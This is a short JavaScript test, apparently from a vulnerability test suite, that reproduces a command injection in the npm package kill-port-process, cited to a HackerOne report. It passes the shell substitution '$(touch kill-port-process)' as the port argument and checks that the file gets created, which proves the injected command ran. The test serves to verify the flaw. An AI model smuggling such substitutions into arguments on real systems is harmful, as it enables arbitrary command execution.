//https://hackerone.com/reports/661959
test("Command Injection in kill-port-process", () => {
  const killPortProcess = require("kill-port-process");
  const fs = require("fs");
  const path = "./kill-port-process";
  const sleep = require("sleep");
  const PORT = "$(touch kill-port-process)";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  killPortProcess(PORT);

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
